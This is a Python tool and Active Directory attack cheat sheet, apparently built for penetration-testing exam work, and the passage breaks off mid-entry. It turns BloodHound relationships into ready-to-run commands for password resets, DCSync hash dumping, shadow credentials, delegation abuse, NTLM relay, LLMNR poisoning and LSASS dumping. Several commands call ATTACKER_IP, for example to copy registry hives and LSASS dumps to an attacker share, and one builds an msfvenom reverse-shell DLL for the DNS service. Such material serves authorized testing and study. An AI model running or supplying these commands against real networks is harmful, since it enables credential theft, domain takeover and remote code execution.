#!/usr/bin/env python3
"""
AD Attack Chain Runner — BloodHound to shell in copy-paste commands.

Parses BloodHound relationships and outputs the exact exploitation
commands for every hop in the chain. Also works as a standalone
AD attack cheatsheet.

No dependencies beyond Python 3.6+ stdlib.
"""

import argparse
import json
import os
import shutil
import sys
import textwrap

# ───────────────── Impacket tool resolver ─────────────────
# Arch/pipx installs as `impacket-secretsdump`
# Exegol/Kali installs as `secretsdump.py` (or bare alias `secretsdump`)
# This resolves whichever is on PATH so copy-paste commands are correct.

_IMPACKET_ALIASES = {
    "impacket-secretsdump": ("secretsdump.py", "secretsdump"),
    "impacket-GetUserSPNs": ("GetUserSPNs.py",),
    "impacket-GetNPUsers":  ("GetNPUsers.py",),
    "impacket-getST":       ("getST.py",),
    "impacket-getTGT":      ("getTGT.py",),
    "impacket-psexec":      ("psexec.py", "psexec"),
    "impacket-wmiexec":     ("wmiexec.py", "wmiexec"),
    "impacket-smbexec":     ("smbexec.py",),
    "impacket-ticketer":    ("ticketer.py",),
    "impacket-dacledit":    ("dacledit.py",),
    "impacket-addcomputer": ("addcomputer.py",),
    "impacket-rbcd":        ("rbcd.py",),
    "impacket-mssqlclient": ("mssqlclient.py",),
    # These appear bare in commands — resolve in reverse on Arch
    "ntlmrelayx.py":        ("ntlmrelayx.py", "impacket-ntlmrelayx", "ntlmrelayx"),
    "smbserver.py":         ("smbserver.py", "impacket-smbserver", "smbserver"),
    "reg.py":               ("reg.py", "impacket-reg"),
}

_TOOL_CACHE: dict = {}

def _resolve(canonical: str, alternatives: tuple) -> str:
    if canonical in _TOOL_CACHE:
        return _TOOL_CACHE[canonical]
    if shutil.which(canonical):
        _TOOL_CACHE[canonical] = canonical
        return canonical
    for alt in alternatives:
        if shutil.which(alt):
            _TOOL_CACHE[canonical] = alt
            return alt
    _TOOL_CACHE[canonical] = canonical
    return canonical


# ───────────────── ANSI helpers ───────────────────────────

def _has_color():
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_C = _has_color()

def _a(code, t): return f"\033[{code}m{t}\033[0m" if _C else t
def red(t):     return _a("91", t)
def green(t):   return _a("92", t)
def yellow(t):  return _a("93", t)
def blue(t):    return _a("94", t)
def magenta(t): return _a("95", t)
def cyan(t):    return _a("96", t)
def bold(t):    return _a("1", t)
def dim(t):     return _a("2", t)

BANNER = (
    f"\n{bold(cyan('═══════════════════════════════════════'))}\n"
    f"  {bold('ADCHAIN')}\n"
    f"{bold(cyan('═══════════════════════════════════════'))}\n"
    f"  {dim('BloodHound to shell. No guesswork.')}\n"
)

# ═══════════════════════════════════════════════════════════
#              AD RELATIONSHIP → ATTACK MAP
# ═══════════════════════════════════════════════════════════
#
# Each entry: relationship_name → {
#   "desc": what it means,
#   "risk": severity,
#   "attacks": [
#     { "tool": ..., "cmd": template, "note": ... },
#   ]
# }
#
# Templates use: {source}, {target}, {domain}, {dc_ip},
#                {password}, {hash}, {target_group}

ATTACKS = {

    # ── Direct credential abuse ──

    "GenericAll": {
        "desc": "Full control over the target object — change password, modify attributes, anything",
        "risk": "CRITICAL",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": 'bloodyAD -d {domain} -u {source} -p \'{password}\' --host {dc_ip} set password {target} \'NewP@ssw0rd123!\'',
                "note": "Reset the target's password directly",
            },
            {
                "tool": "net rpc (Linux)",
                "cmd": "net rpc password {target} 'NewP@ssw0rd123!' -U '{domain}/{source}%{password}' -S {dc_ip}",
                "note": "Reset password via RPC",
            },
            {
                "tool": "PowerView",
                "cmd": "$cred = ConvertTo-SecureString 'NewP@ssw0rd123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity {target} -AccountPassword $cred",
                "note": "Reset password from a Windows foothold",
            },
            {
                "tool": "Targeted Kerberoast (if SPN set)",
                "cmd": "# Set an SPN then roast it:\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set object {target} servicePrincipalName -v 'HTTP/pwned.{domain}'\nimpacket-GetUserSPNs '{domain}/{source}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.hash\nhashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
                "note": "Set a fake SPN on the target, then Kerberoast their hash",
            },
        ],
    },

    "GenericWrite": {
        "desc": "Can modify most attributes on the target — set SPN for Kerberoasting, modify logon scripts",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "Targeted Kerberoast",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set object {target} servicePrincipalName -v 'HTTP/pwned.{domain}'\nimpacket-GetUserSPNs '{domain}/{source}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.hash\nhashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
                "note": "Set a fake SPN then crack the TGS hash",
            },
            {
                "tool": "Logon Script abuse",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set object {target} scriptPath -v '\\\\ATTACKER_IP\\share\\payload.exe'",
                "note": "Set a malicious logon script that runs at next login",
            },
        ],
    },

    "WriteOwner": {
        "desc": "Can take ownership of the target object, then grant yourself GenericAll",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD (2-step)",
                "cmd": "# Step 1: Take ownership\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set owner {target} {source}\n\n# Step 2: Grant yourself GenericAll\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} add genericAll {target} {source}\n\n# Step 3: Now exploit as GenericAll (e.g. reset password)\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set password {target} 'NewP@ssw0rd123!'",
                "note": "Own it → grant yourself full control → exploit",
            },
            {
                "tool": "PowerView",
                "cmd": "Set-DomainObjectOwner -Identity {target} -OwnerIdentity {source}\nAdd-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {source} -Rights All",
                "note": "Same 2-step from a Windows foothold",
            },
        ],
    },

    "WriteDACL": {
        "desc": "Can modify the target's ACL — grant yourself any permission",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "# Grant yourself GenericAll on the target\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} add genericAll {target} {source}\n\n# Then exploit (e.g. reset password, DCSync, etc.)\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set password {target} 'NewP@ssw0rd123!'",
                "note": "Modify the DACL to give yourself full control",
            },
            {
                "tool": "Impacket dacledit",
                "cmd": "impacket-dacledit -action write -rights DCSync -principal {source} -target-dn 'DC={domain_dn}' '{domain}/{source}:{password}'",
                "note": "Grant yourself DCSync rights directly",
            },
            {
                "tool": "PowerView",
                "cmd": "Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {source} -Rights All",
                "note": "Grant GenericAll from a Windows foothold",
            },
        ],
    },

    "ForceChangePassword": {
        "desc": "Can reset the target's password without knowing the current one",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} set password {target} 'NewP@ssw0rd123!'",
                "note": "Direct password reset",
            },
            {
                "tool": "net rpc",
                "cmd": "net rpc password {target} 'NewP@ssw0rd123!' -U '{domain}/{source}%{password}' -S {dc_ip}",
                "note": "RPC-based password reset from Linux",
            },
            {
                "tool": "rpcclient",
                "cmd": "rpcclient -U '{source}%{password}' {dc_ip} -c 'setuserinfo2 {target} 23 NewP@ssw0rd123!'",
                "note": "Via rpcclient setuserinfo2",
            },
        ],
    },

    "AddMember": {
        "desc": "Can add users to the target group",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} add groupMember {target} {source}",
                "note": "Add yourself (or another compromised user) to the group",
            },
            {
                "tool": "net rpc",
                "cmd": "net rpc group addmem '{target}' '{source}' -U '{domain}/{source}%{password}' -S {dc_ip}",
                "note": "Add member via RPC",
            },
            {
                "tool": "PowerView",
                "cmd": "Add-DomainGroupMember -Identity '{target}' -Members '{source}'",
                "note": "From a Windows foothold",
            },
        ],
    },

    "DCSync": {
        "desc": "Can replicate domain credentials — dump every hash in the domain",
        "risk": "CRITICAL",
        "attacks": [
            {
                "tool": "NXC (cleaner output)",
                "cmd": "nxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds\n# Dump only enabled accounts:\nnxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds --enabled\n# Dump single user:\nnxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds --user Administrator",
                "note": "Easier to read than secretsdump — columns: user:rid:lmhash:nthash",
            },
            {
                "tool": "NXC (pass-the-hash)",
                "cmd": "nxc smb {dc_ip} -u {source} -H '{hash}' -d {domain} --ntds",
                "note": "DCSync with an NTLM hash instead of a password",
            },
            {
                "tool": "Impacket secretsdump",
                "cmd": "impacket-secretsdump '{domain}/{source}:{password}'@{dc_ip}",
                "note": "Classic dump — verbose output includes Kerberos keys too",
            },
            {
                "tool": "Impacket secretsdump (PtH)",
                "cmd": "impacket-secretsdump '{domain}/{source}'@{dc_ip} -hashes :{hash}",
                "note": "Pass-the-hash variant",
            },
            {
                "tool": "Mimikatz",
                "cmd": "mimikatz # lsadump::dcsync /domain:{domain} /user:Administrator",
                "note": "From a Windows foothold",
            },
        ],
    },

    "WriteKeyCredentialLink": {
        "desc": "Shadow Credentials — add a key credential to the target, get their NT hash without changing their password",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "pyWhisker (Linux)",
                "cmd": "# Add shadow credential:\npywhisker -a add -d {domain} -u {source} -p '{password}' --dc-ip {dc_ip} --target {target} --filename {target}_shadow\n\n# Get NT hash from the pfx:\npkinittools-gettgtpkinit {domain}/{target} -cert-pfx {target}_shadow.pfx -pfx-pass <GENERATED_PASS> {target}.ccache\nexport KRB5CCNAME={target}.ccache\npkinittools-getnthash {domain}/{target} -key <AS-REP_ENC_KEY>",
                "note": "Cleaner than ForceChangePassword — target's password stays the same",
            },
            {
                "tool": "Whisker (Windows foothold)",
                "cmd": "Whisker.exe add /target:{target}\n# Whisker prints the Rubeus command — copy + run it:\nRubeus.exe asktgt /user:{target} /certificate:<BASE64> /password:<PASS> /nowrap\n# Then get NT hash:\nRubeus.exe changepw /ticket:<TGT> /new:FakeP@ss /noprint\n# Or use the TGT for PtT directly",
                "note": "Windows-side Shadow Credentials via Rubeus",
            },
        ],
    },

    "ReadLAPSPassword": {
        "desc": "Can read the GMSA (Group Managed Service Account) password",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} get object {target} --attr msDS-ManagedPassword",
                "note": "Read the GMSA password blob and extract the NT hash",
            },
            {
                "tool": "gMSADumper",
                "cmd": "python3 gMSADumper.py -u '{source}' -p '{password}' -d {domain}",
                "note": "Dedicated tool for GMSA password extraction",
            },
            {
                "tool": "Impacket (after getting hash)",
                "cmd": "# Use the extracted NT hash:\nevil-winrm -i {dc_ip} -u {target} -H '<extracted_hash>'",
                "note": "Login with the GMSA account's hash",
            },
        ],
    },

    "AllowedToDelegate": {
        "desc": "Constrained delegation — can impersonate users to specific services",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "Impacket getST",
                "cmd": "impacket-getST -spn 'cifs/{target}' -impersonate Administrator '{domain}/{source}:{password}' -dc-ip {dc_ip}\nexport KRB5CCNAME=Administrator@cifs_{target}@{domain}.ccache\nimpacket-psexec -k -no-pass {domain}/Administrator@{target}",
                "note": "Request a service ticket impersonating Administrator",
            },
            {
                "tool": "Rubeus",
                "cmd": "Rubeus.exe s4u /user:{source} /rc4:{hash} /impersonateuser:Administrator /msdsspn:cifs/{target} /ptt",
                "note": "S4U2Self + S4U2Proxy from a Windows foothold",
            },
        ],
    },

    "AllowedToAct": {
        "desc": "Resource-based constrained delegation (RBCD) — can configure delegation on the target",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "Impacket RBCD",
                "cmd": "# Step 1: Create a machine account\nimpacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ssw0rd' '{domain}/{source}:{password}' -dc-ip {dc_ip}\n\n# Step 2: Set RBCD\nimpacket-rbcd '{domain}/{source}:{password}' -action write -delegate-to '{target}$' -delegate-from 'EVIL$' -dc-ip {dc_ip}\n\n# Step 3: Get a ticket\nimpacket-getST -spn 'cifs/{target}.{domain}' -impersonate Administrator '{domain}/EVIL$:P@ssw0rd' -dc-ip {dc_ip}\n\n# Step 4: Use it\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass {target}.{domain}",
                "note": "Full RBCD attack chain",
            },
        ],
    },

    "SQLAdmin": {
        "desc": "Has sysadmin rights on an MSSQL instance",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "Impacket mssqlclient",
                "cmd": "impacket-mssqlclient '{domain}/{source}:{password}'@{target} -windows-auth\n\n# Enable xp_cmdshell:\nENABLE_xp_cmdshell\nxp_cmdshell whoami",
                "note": "Connect and enable command execution",
            },
            {
                "tool": "MSSQL IMPERSONATE → xp_cmdshell",
                "cmd": "# If you can impersonate sa:\nEXECUTE AS LOGIN = 'sa';\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';",
                "note": "Impersonate SA and enable xp_cmdshell",
            },
        ],
    },

    "CanPSRemote": {
        "desc": "Can connect via WinRM / PowerShell Remoting",
        "risk": "MEDIUM",
        "attacks": [
            {
                "tool": "Evil-WinRM",
                "cmd": "evil-winrm -i {target} -u {source} -p '{password}'",
                "note": "Get an interactive PowerShell shell",
            },
            {
                "tool": "Evil-WinRM (PtH)",
                "cmd": "evil-winrm -i {target} -u {source} -H '{hash}'",
                "note": "Pass-the-hash via WinRM",
            },
        ],
    },

    "CanRDP": {
        "desc": "Can connect via Remote Desktop",
        "risk": "MEDIUM",
        "attacks": [
            {
                "tool": "xfreerdp",
                "cmd": "xfreerdp /d:{domain} /u:{source} /p:'{password}' /v:{target} /cert-ignore /drive:WORKSPACE,/workspace /drive:TOOLS,$HOME/oscp-tools/windows /dynamic-resolution",
                "note": "Mounts /workspace + killchain tools folder (~/oscp-tools/windows) — access as \\\\tsclient\\TOOLS inside RDP",
            },
            {
                "tool": "xfreerdp (PtH)",
                "cmd": "xfreerdp /d:{domain} /u:{source} /pth:{hash} /v:{target} /cert-ignore /drive:WORKSPACE,/workspace /drive:TOOLS,$HOME/oscp-tools/windows /dynamic-resolution",
                "note": "Pass-the-hash RDP — requires Restricted Admin mode on target",
            },
            {
                "tool": "rdesktop",
                "cmd": "rdesktop -u {source} -p '{password}' -d {domain} {target}",
                "note": "Fallback RDP client",
            },
        ],
    },

    "HasSIDHistory": {
        "desc": "SID History contains a privileged SID — instant privilege escalation",
        "risk": "CRITICAL",
        "attacks": [
            {
                "tool": "Mimikatz (inject SID)",
                "cmd": "mimikatz # sid::patch\nmimikatz # sid::add /sam:{source} /new:S-1-5-21-...-500",
                "note": "If you can modify SID history, inject Administrator SID",
            },
        ],
    },

    "AddSelf": {
        "desc": "Can add yourself to a group",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "bloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} add groupMember {target} {source}",
                "note": "Add yourself to the target group",
            },
            {
                "tool": "net rpc",
                "cmd": "net rpc group addmem '{target}' '{source}' -U '{domain}/{source}%{password}' -S {dc_ip}",
                "note": "Via RPC",
            },
        ],
    },

    "Owns": {
        "desc": "Owner of the object — can modify DACL, effectively full control",
        "risk": "HIGH",
        "attacks": [
            {
                "tool": "bloodyAD",
                "cmd": "# As owner, grant yourself GenericAll:\nbloodyAD -d {domain} -u {source} -p '{password}' --host {dc_ip} add genericAll {target} {source}",
                "note": "Owners can modify the DACL — give yourself full control",
            },
        ],
    },
}

# ═══════════════════════════════════════════════════════════
#              STANDALONE ATTACK REFERENCE
# ═══════════════════════════════════════════════════════════

STANDALONE_ATTACKS = {

    "User Enumeration (Pre-Creds)": {
        "desc": "Enumerate valid usernames before you have any credentials",
        "attacks": [
            {
                "tool": "kerbrute userenum",
                "cmd": "kerbrute userenum -d {domain} --dc {dc_ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt",
                "note": "Fastest way to build a user list with zero creds — required before AS-REP roasting",
            },
            {
                "tool": "NXC RID brute (null/guest auth)",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute\n# Or null:\nnxc smb {dc_ip} -u '' -p '' --rid-brute",
                "note": "Returns all accounts by RID — works when LDAP is locked down",
            },
            {
                "tool": "NXC users-export",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
            },
        ],
    },

    "Post-NTDS Hash Spray": {
        "desc": "After dumping NTDS, spray hashes across the network to find where they work",
        "attacks": [
            {
                "tool": "NXC — spray Administrator hash (local auth)",
                "cmd": "nxc smb 192.168.1.0/24 -u Administrator -H '{hash}' --local-auth",
                "note": "Finds every box where the same local admin hash works — common in flat networks",
            },
            {
                "tool": "NXC — spray domain account hash",
                "cmd": "nxc smb 192.168.1.0/24 -u {source} -H '{hash}' -d {domain}",
            },
            {
                "tool": "NXC — test specific hash on specific target",
                "cmd": "nxc smb {target} -u {source} -H '{hash}' -d {domain} -x 'whoami'",
                "note": "Confirm access and run a command in one shot",
            },
            {
                "tool": "NXC — find all local admins from hash list",
                "cmd": "nxc smb 192.168.1.0/24 -u administrators.txt -H hashes.txt --local-auth --continue-on-success",
            },
        ],
    },

    "NTLM Relay (RBCD — no ADCS needed)": {
        "desc": "Relay coerced NTLM auth to LDAP to write RBCD — works when ADCS isn't available",
        "attacks": [
            {
                "tool": "Step 1 — Start ntlmrelayx to LDAP",
                "cmd": "ntlmrelayx.py -t ldap://{dc_ip} --delegate-access --no-smb-server -smb2support",
                "note": "Creates a machine account and sets RBCD automatically on success",
            },
            {
                "tool": "Step 2 — Coerce target authentication",
                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
            },
            {
                "tool": "Step 3 — Get impersonation ticket",
                "cmd": "impacket-getST -spn 'cifs/{target}.{domain}' -impersonate Administrator '{domain}/EVIL$:P@ssw0rd' -dc-ip {dc_ip}\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass {target}.{domain}",
                "note": "Machine account name + password printed by ntlmrelayx in step 1",
            },
        ],
    },

    "SeBackupPrivilege": {
        "desc": "Dump SAM/SYSTEM/SECURITY registry hives — common on backup service accounts",
        "attacks": [
            {
                "tool": "Evil-WinRM — reg save + download",
                "cmd": "reg save hklm\\sam sam.hive\nreg save hklm\\system sys.hive\nreg save hklm\\security sec.hive\ndownload sam.hive\ndownload sys.hive\ndownload sec.hive",
                "note": "Run inside evil-winrm shell",
            },
            {
                "tool": "Impacket reg.py (remote)",
                "cmd": "# Setup SMB server first:\nsmbserver.py -smb2support share .\n\n# Dump hives remotely:\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SAM' -o '\\\\ATTACKER_IP\\share'\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SYSTEM' -o '\\\\ATTACKER_IP\\share'\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SECURITY' -o '\\\\ATTACKER_IP\\share'",
                "note": "Impacket auto-enables SeBackupPrivilege if disabled",
            },
            {
                "tool": "Parse hives offline",
                "cmd": "secretsdump -system sys.hive -sam sam.hive -security sec.hive LOCAL",
            },
        ],
    },

    "DnsAdmins Abuse": {
        "desc": "DnsAdmins group members can load a DLL into the DNS service (runs as SYSTEM)",
        "attacks": [
            {
                "tool": "Step 1 — Generate malicious DLL",
                "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll\n# Or add yourself to local admins:\nmsfvenom -p windows/x64/exec CMD='net localgroup administrators {source} /add' -f dll -o evil.dll",
            },
            {
                "tool": "Step 2 — Host on SMB share",
                "cmd": "smbserver.py -smb2support share .",
                "note": "DNS service will pull the DLL over SMB — must be reachable from the DC",
            },
            {
                "tool": "Step 3 — Set DLL path + restart DNS",
                "cmd": "# From Windows foothold (as DnsAdmins member):\ndnscmd /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\evil.dll\nsc.exe stop dns\nsc.exe start dns",
                "note": "DNS restart requires specific permissions — check with: sc.exe sdshow dns",
            },
            {
                "tool": "Step 4 — Cleanup (remove plugin after getting shell)",
                "cmd": "dnscmd /config /serverlevelplugindll \"\"\nsc.exe stop dns\nsc.exe start dns",
                "note": "Always clean up — leaving a bad DLL will keep crashing DNS",
            },
        ],
    },

    "Null Auth & Initial Enum": {
        "desc": "Check for unauthenticated access — null session, guest, anonymous LDAP",
        "attacks": [
            {
                "tool": "NXC — null + guest share enum",
                "cmd": "nxc smb {dc_ip} -u '' -p '' --shares\nnxc smb {dc_ip} -u 'Guest' -p '' --shares",
            },
            {
                "tool": "NXC — enumerate users + export",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users\n# Export directly to file (no awk needed):\nnxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
            },
            {
                "tool": "NXC — password policy + groups",
                "cmd": "nxc smb {dc_ip} -u '' -p '' --pass-pol\nnxc smb {dc_ip} -u '' -p '' --groups",
            },
            {
                "tool": "NXC — filter shares by permission",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --shares\n# Filter to only writable:\nnxc smb {dc_ip} -u 'Guest' -p '' --shares WRITE\n# Filter to readable:\nnxc smb {dc_ip} -u 'Guest' -p '' --shares READ",
            },
            {
                "tool": "NXC — RID brute (get all account names)",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute",
                "note": "Returns usernames by RID — useful when --users is blocked",
            },
            {
                "tool": "enum4linux-ng",
                "cmd": "enum4linux-ng -A {dc_ip}",
                "note": "Full null session enumeration: users, groups, shares, password policy",
            },
        ],
    },

    "LLMNR Poisoning": {
        "desc": "Poison LLMNR/NBT-NS to steal Net-NTLMv2 hashes from broadcast traffic",
        "attacks": [
            {
                "tool": "Step 1 — Start Responder",
                "cmd": "responder -I tun0",
                "note": "Poisons LLMNR/NBT-NS — hashes saved to /usr/share/responder/logs/",
            },
            {
                "tool": "Step 2 — Plant slinky (if writeable share exists)",
                "cmd": "nxc smb {target} -u 'Guest' -p '' -M slinky -o SERVER=ATTACKER_IP NAME=not-malicious SHARES=Uploads",
                "note": "Anyone who opens the share triggers auth to your Responder",
            },
            {
                "tool": "Step 3 — Crack NTLMv2",
                "cmd": "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt",
            },
        ],
    },

    "Timeroasting": {
        "desc": "Crack machine account passwords using SNTP — works without any credentials",
        "attacks": [
            {
                "tool": "Step 1 — RID brute to get account IDs",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute",
                "note": "Note the RID numbers — you'll match them to cracked hashes",
            },
            {
                "tool": "Step 2 — Timeroast",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' -M timeroast",
            },
            {
                "tool": "Step 3 — Crack SNTP hashes",
                "cmd": "hashcat -m 31300 sntp.hashes /usr/share/wordlists/rockyou.txt",
                "note": "Match cracked RID back to account name from step 1",
            },
            {
                "tool": "Reference",
                "cmd": "# https://www.thehacker.recipes/ad/movement/kerberos/roasting/timeroast",
            },
        ],
    },

    "BloodHound Collection": {
        "desc": "Collect AD data for BloodHound attack path analysis",
        "attacks": [
            {
                "tool": "NXC LDAP ingestor (preferred)",
                "cmd": "nxc ldap {domain} -u {source} -p '{password}' --bloodhound --collection All --dns-server {dc_ip}",
                "note": "Outputs .zip directly — drag into BloodHound UI",
            },
            {
                "tool": "bloodyAD bloodhound export",
                "cmd": "bloodyad -H {dc_ip} -d {domain} -u {source} -p '{password}' get bloodhound",
            },
            {
                "tool": "rusthound (faster on large domains)",
                "cmd": "rusthound -d {domain} -u '{source}' -p '{password}' -n {dc_ip} --adcs -o ./bloodhound_output",
            },
            {
                "tool": "SharpHound (Windows foothold)",
                "cmd": "# Upload via evil-winrm:\nupload $HOME/oscp-tools/ad/SharpHound.exe\n.\\SharpHound.exe -c All\n# Download the zip:\ndownload <timestamp>_BloodHound.zip",
            },
        ],
    },

    "Kerberos Delegation": {
        "desc": "Abuse constrained/unconstrained delegation to impersonate privileged users",
        "attacks": [
            {
                "tool": "Step 1 — Find delegation (NXC)",
                "cmd": "nxc ldap {dc_ip} -u {source} -p '{password}' --find-delegation",
            },
            {
                "tool": "Step 2 — Get service ticket (Impacket getST)",
                "cmd": "impacket-getST -spn TARGET_SPN -impersonate Administrator -dc-ip {dc_ip} '{domain}/{source}:{password}'",
                "note": "TARGET_SPN from BloodHound or --find-delegation output",
            },
            {
                "tool": "Step 3 — Export + use ticket",
                "cmd": "export KRB5CCNAME=Administrator.ccache\nnxc smb {domain} -u Administrator -k --use-kcache",
            },
        ],
    },

    "ADCS ESC1": {
        "desc": "Certificate template allows SAN — enroll as any user including Administrator",
        "attacks": [
            {
                "tool": "Step 1 — Find vulnerable templates (certipy)",
                "cmd": "certipy find -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -text -enabled -vulnerable",
            },
            {
                "tool": "Step 2 — Request cert as Administrator",
                "cmd": "certipy req -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -target CA.{domain} -ca DOMAIN-CA -template UserTemplate -upn 'Administrator@{domain}'",
                "note": "Replace DOMAIN-CA and UserTemplate with values from step 1",
            },
            {
                "tool": "Step 3 — Authenticate and get hash",
                "cmd": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
                "note": "Returns NT hash — use with PtH",
            },
            {
                "tool": "Reference",
                "cmd": "# https://github.com/ly4k/Certipy/wiki",
            },
        ],
    },

    "ADCS ESC8": {
        "desc": "NTLM relay to AD CS HTTP endpoint — coerce any machine to get its cert",
        "attacks": [
            {
                "tool": "Step 1 — Find web enrollment endpoint",
                "cmd": "certipy find -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -text -enabled -vulnerable",
            },
            {
                "tool": "Step 2 — Set up NTLM relay to certsrv",
                "cmd": "ntlmrelayx.py -t http://DC.{domain}/certsrv/certfnsh.asp --adcs --template User -smb2support",
                "note": "Terminal 1 — relay to the CA web enrollment page",
            },
            {
                "tool": "Step 3 — Coerce target to relay",
                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
                "note": "Terminal 2 — force target DC/machine to authenticate",
            },
            {
                "tool": "Step 4 — Authenticate with received cert",
                "cmd": "certipy auth -pfx <received>.pfx -dc-ip {dc_ip}",
            },
        ],
    },

    "Dump Hashes (Post-Compromise)": {
        "desc": "Extract credentials once you have local/domain admin access",
        "attacks": [
            {
                "tool": "NXC — dump LSASS (lsassy)",
                "cmd": "nxc smb {target} -d {domain} -u {source} -H '{hash}' -M lsassy",
                "note": "Dumps LSASS remotely — no upload needed",
            },
            {
                "tool": "NXC — dump SAM/LSA registry",
                "cmd": "nxc smb {target} -d {domain} -u {source} -p '{password}' --sam\nnxc smb {target} -d {domain} -u {source} -p '{password}' --lsa",
            },
            {
                "tool": "NXC — dump NTDS (domain admin required)",
                "cmd": "nxc smb {dc_ip} -d {domain} -u {source} -p '{password}' --ntds",
            },
            {
                "tool": "Evil-WinRM — upload mimikatz",
                "cmd": "upload $HOME/oscp-tools/ad/mimikatz/x64/mimikatz.exe\n.\\mimikatz.exe\nprivilege::debug\nsekurlsa::logonPasswords",
            },
            {
                "tool": "LSASS dump offline (comsvcs.dll)",
                "cmd": "# On target — find lsass PID:\ntasklist | findstr lsass\n# Dump to attacker SMB share:\nsmbserver.py -smb2support share .\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <PID> \\\\ATTACKER_IP\\share\\lsass.dmp full\n# Parse offline:\npypykatz lsa minidump lsass.dmp",
            },
        ],
    },

    "Kerberoasting": {
        "desc": "Crack service account passwords from TGS tickets",
        "attacks": [
            {
                "tool": "NXC (preferred)",
                "cmd": "nxc ldap {dc_ip} -u {source} -p '{password}' --kerberoasting kerberoast.hash",
            },
            {
                "tool": "NXC via Chisel/proxychains",
                "cmd": "proxychains nxc ldap {domain} -u {source} -p '{password}' --kerberoasting kerberoast.hash",
            },
            {
                "tool": "NXC via Ligolo",
                "cmd": "nxc ldap 240.0.0.1 -u {source} -p '{password}' --kerberoasting kerberoast.hash",
                "note": "240.0.0.1 = DC localhost via Ligolo magic CIDR",
            },
            {
                "tool": "Impacket",
                "cmd": "impacket-GetUserSPNs '{domain}/{source}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.hash",
            },
            {
                "tool": "Rubeus (Windows foothold)",
                "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.hash",
            },
            {
                "tool": "Hashcat crack",
                "cmd": "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
            },
        ],
    },

    "AS-REP Roasting": {
        "desc": "Crack passwords of accounts with pre-auth disabled",
        "attacks": [
            {
                "tool": "NXC — step 1: get users (null/guest auth)",
                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
            },
            {
                "tool": "NXC — step 2: ASREP roast the list",
